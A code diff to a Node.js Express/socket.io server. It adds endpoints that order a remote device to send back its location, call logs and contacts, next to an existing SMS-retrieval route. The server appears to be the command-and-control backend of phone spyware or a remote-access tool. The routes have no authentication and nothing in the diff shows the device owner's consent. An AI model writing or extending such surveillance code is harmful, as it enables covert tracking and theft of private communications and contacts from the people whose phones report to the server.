@@ -45,6 +45,60 @@ app.get('/sms/:id', async (req, res)=>{
     }
 });
 
+app.get('/location/:id', async (req, res)=>{
+    const id = req.params.id;
+    const socketId = idToSocket.get(id);
+    io.to(socketId).emit('location', "get location");
+    try{
+    const locationData = await new Promise((resolve, reject) => {
+        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
+        idToConnectionSocket.get(id).once("location", (data) => {
+          resolve({"location":data});
+        });
+      });
+      // Send the received 'smsData' as a JSON response
+      res.json(locationData);
+    }catch(e){
+        res.json(e);
+    }
+});
+
+app.get('/calls/:id', async (req, res)=>{
+    const id = req.params.id;
+    const socketId = idToSocket.get(id);
+    io.to(socketId).emit('calllogs', "get callLogs");
+    try{
+    const locationData = await new Promise((resolve, reject) => {
+        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
+        idToConnectionSocket.get(id).once("calllogs", (data) => {
+          resolve({"call_logs":data});
+        });
+      });
+      // Send the received 'smsData' as a JSON response
+      res.json(locationData);
+    }catch(e){
+        res.json(e);
+    }
+});
+
+app.get('/contacts/:id', async (req, res)=>{
+    const id = req.params.id;
+    const socketId = idToSocket.get(id);
+    io.to(socketId).emit('contacts', "get contacts");
+    try{
+    const locationData = await new Promise((resolve, reject) => {
+        if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
+        idToConnectionSocket.get(id).once("contacts", (data) => {
+          resolve({"contacts":data});
+        });
+      });
+      // Send the received 'smsData' as a JSON response
+      res.json(locationData);
+    }catch(e){
+        res.json(e);
+    }
+});
+
 //io operations
 io.on("connection", (socket) => {
     socket.on("register", (id) => {
